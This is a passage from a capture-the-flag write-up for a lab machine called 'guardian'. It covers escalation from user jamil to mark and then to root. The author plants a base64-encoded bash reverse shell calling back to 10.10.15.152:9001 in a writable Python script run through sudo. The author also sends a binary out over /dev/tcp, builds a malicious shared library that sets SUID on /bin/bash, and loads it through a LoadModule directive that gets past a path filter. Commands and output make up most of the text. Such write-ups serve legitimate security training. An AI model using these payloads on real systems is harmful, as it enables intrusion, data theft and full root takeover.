    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```
hm interesting, another user `mark` can write it
### File permissions

Now lets check in greater detail what other files does `mark` have write permission towards:

`status.py` can be writen by `mark`
```shell
jamil@guardian:~$ cd /opt/scripts/utilities/     
cd /opt/scripts/utilities/
jamil@guardian:/opt/scripts/utilities$ ls
ls
output  utilities.py  utils
jamil@guardian:/opt/scripts/utilities$ cd utils
cd utils
jamil@guardian:/opt/scripts/utilities/utils$ ls -la
ls -la
total 24
drwxrwsr-x 2 root root   4096 Jul 10 14:20 .
drwxr-sr-x 4 root admins 4096 Jul 10 13:53 ..
-rw-r----- 1 root admins  287 Apr 19  2025 attachments.py
-rw-r----- 1 root admins  246 Jul 10 14:20 db.py
-rw-r----- 1 root admins  226 Apr 19  2025 logs.py
-rwxrwx--- 1 mark admins  253 Apr 26  2025 status.py
```
So the idea now is to bounce the shell code to write status.py and then execute utilities.py

## Shell as mark

edit the file so it has an encoded rev shell
https://www.revshells.com/
used the linux, bash -i one with b64 encoding
```shell
sh -i >& /dev/tcp/10.10.15.152/9001 0>&1
```

```shell
"printf c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTUyLzkwMDEgMD4mMQ==|base64 -d|bash"
```

```shell
jamil@guardian:/opt/scripts/utilities/utils$ cat status.py
import platform
import psutil
import os

def system_status():
    import os
    os.system("printf c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTUyLzkwMDEgMD4mMQ==|base64 -d|bash")
```

then run
```shell
sudo -u mark /opt/scripts/utilities/utilities.py system-status
```
and received shell
```shell
└──╼ [★]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.15.152] from (UNKNOWN) [10.129.237.248] 58410
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
mark@guardian:/opt/scripts/utilities/utils$ 
```

### Fixing unstable shell

for some reason my shell was unstable even after stabilizing with python
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
For example i had problems with literal escape sequences (`^[[200~`). This means **the shell is not attached to a real PTY**

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
so i did this, on the active revshell of mark i run
```shell
Ctrl+Z
```
this will send it to background, and you should now be on your local machine, now run
```shell
stty raw -echo
```
and then type
```shell
fg
```
and hit enter once, now the the terminal should be clear, next type
```shell
reset
```
and then
```shell
export TERM=xterm
```
now the shell is fully stable , we have fixed a half-broken TTY

### sudo -l as mark

```shell
mark@guardian:/opt/scripts/utilities/utils$ sudo -l
sudo -l
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```
The path is clear, we need to understand how `safeapache2ctl` works in order to use it for privesc

#### Unknown binary
### Decompile binary
Lets decompile safeapache2ctl
#### Transfer file from target to attacker
```shell
cat /usr/local/bin/safeapache2ctl > /dev/tcp/10.10.15.152/3333
```
start listener and automatically save file
```shell
nc -lvnp 3333 > safeapache2ctl
```
file is now transferred locally and is ready for decompilation

#### Functions

Using ghidra, i found those 2 functions as most crucial ones (main, is_unsafe_line)
`main`:
```c

undefined8 main(int param_1,undefined8 *param_2)

{
  int iVar1;
  char *pcVar2;
  FILE *__stream;
  long in_FS_OFFSET;
  char local_1418 [1024];
  char local_1018 [4104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 == 3) {
    iVar1 = strcmp((char *)param_2[1],"-f");
    if (iVar1 == 0) {
      pcVar2 = realpath((char *)param_2[2],local_1018);
      if (pcVar2 == (char *)0x0) {
        perror("realpath");
      }
      else {
        iVar1 = starts_with(local_1018,"/home/mark/confs/");
        if (iVar1 == 0) {
          fprintf(stderr,"Access denied: config must be inside %s\n","/home/mark/confs/");
        }
        else {
          __stream = fopen(local_1018,"r");
          if (__stream == (FILE *)0x0) {
            perror("fopen");
          }
          else {
            do {
              pcVar2 = fgets(local_1418,0x400,__stream);
              if (pcVar2 == (char *)0x0) {
                fclose(__stream);
                execl("/usr/sbin/apache2ctl","apache2ctl",&DAT_00102072,local_1018,0);
                perror("execl failed");
                goto LAB_00101663;
              }
              iVar1 = is_unsafe_line(local_1418);
            } while (iVar1 == 0);
            fwrite("Blocked: Config includes unsafe directive.\n",1,0x2b,stderr);
            fclose(__stream);
          }
        }
      }
      goto LAB_00101663;
    }
  }
  fprintf(stderr,"Usage: %s -f /home/mark/confs/file.conf\n",*param_2);
LAB_00101663:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 1;
}
```

`is_unsafe_line`
```c

undefined8 is_unsafe_line(undefined8 param_1)

{
  int iVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  char local_1038 [32];
  char local_1018 [4104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  iVar1 = __isoc99_sscanf(param_1,"%31s %1023s",local_1038,local_1018);
  if (iVar1 != 2) {
    uVar2 = 0;
    goto LAB_00101423;
  }
  iVar1 = strcmp(local_1038,"Include");
  if (iVar1 == 0) {
LAB_001013c6:
    if (local_1018[0] == '/') {
      iVar1 = starts_with(local_1018,"/home/mark/confs/");
      if (iVar1 == 0) {
        fprintf(stderr,"[!] Blocked: %s is outside of %s\n",local_1018,"/home/mark/confs/");
        uVar2 = 1;
        goto LAB_00101423;
      }
    }
  }
  else {
    iVar1 = strcmp(local_1038,"IncludeOptional");
    if (iVar1 == 0) goto LAB_001013c6;
    iVar1 = strcmp(local_1038,"LoadModule");
    if (iVar1 == 0) goto LAB_001013c6;
  }
  uVar2 = 0;
LAB_00101423:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar2;
}
```
### Exploiting safeapache2ctl

#### Create malicious C file
```shell
nano ch3ckm8.c
```
contents:
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void init() {
    setuid(0);
    system("chmod +s /bin/bash");
}
```
#### Compile and produce .so file
```shell
gcc -shared -fPIC -o /home/mark/confs/ch3ckm8.so /home/mark/ch3ckm8.c
```
#### Create conf file linking to generated .so file
```shell
cat <<EOF > /home/mark/confs/exp.conf
LoadModule evil_module /home/mark/confs/ch3ckm8.so
EOF
```
#### Load conf file via safeapache2ctl
```shell
sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exp.conf
```
lets check if it worked
```shell
ls -al /bin/bash
bash -p
```
we are now root, grabbed root flag!

## Shell as root
```shell
mark@guardian:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
mark@guardian:~$ bash -p
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# cat root.txt 
61019cf9c08d61dad4335bcbea25cad4
```

-----------
# Summary

webapp -> (default pass found + userlist found) -> bruteforce -> webapp login as user -> fuzzing chats -> found creds to login on subdomain -> found source code (found DB creds and more) -> exploited source code to create admin user -> access admin panel -> LFI -> shell as www-data -> login to DB with creds found earlier on source code -> extract password hashes -> crack hashes -> shell as jamil (USER FLAG) -> sudo -l -> path -> another user (mark) can write it -> injected revshell -> received shell as mark -> sudo -l -> binary -> decompiled & understood its functionality -> exploit -> shelll as root (ROOT FLAG)


---------
# Sidenotes


Great web-app based machine! Tough and lengthy foothold and the privesc was challenging, especially the part where decompilation was needed in order to understand how to move forward. I see myself revisiting this one for web-app related attacks.